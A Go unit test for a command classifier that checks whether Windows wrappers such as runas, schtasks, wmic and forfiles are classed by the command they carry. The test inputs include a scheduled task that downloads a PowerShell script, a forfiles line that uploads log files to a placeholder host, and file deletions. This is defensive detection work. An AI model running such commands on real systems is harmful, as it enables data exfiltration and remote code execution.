package classify

import "testing"

func TestWindowsRunnersPassTheirCommandThrough(t *testing.T) {
	for cmd, want := range map[string]string{
		`runas /user:Administrator "curl.exe https://x.test"`:                             ClassNetwork,
		`runas /noprofile /user:dom\admin "cmd /c del C:\data\x.txt"`:                     ClassFilesystem,
		`schtasks /create /tn upd /tr "powershell -c iwr https://x.test/a.ps1" /sc daily`: ClassNetwork,
		`SCHTASKS.EXE /Create /TN upd /TR "curl https://x.test" /SC ONLOGON`:              ClassNetwork,
		`wmic process call create "cmd /c curl https://x.test"`:                           ClassNetwork,
		`wmic /node:host1 process call create "rm x"`:                                     ClassFilesystem,
		`forfiles /p C:\logs /m *.log /c "cmd /c curl -T @file https://x.test"`:           ClassNetwork,
		`forfiles /S /M *.tmp /C "cmd /c del @path"`:                                      ClassFilesystem,

		`schtasks /query /fo LIST`: ClassOther,
		`wmic process list brief`:  ClassOther,
		`runas /showtrustlevels`:   ClassOther,
	} {
		if _, got := Bash(cmd); got != want {
			t.Errorf("Bash(%q) = %s, want %s", cmd, got, want)
		}
	}
}
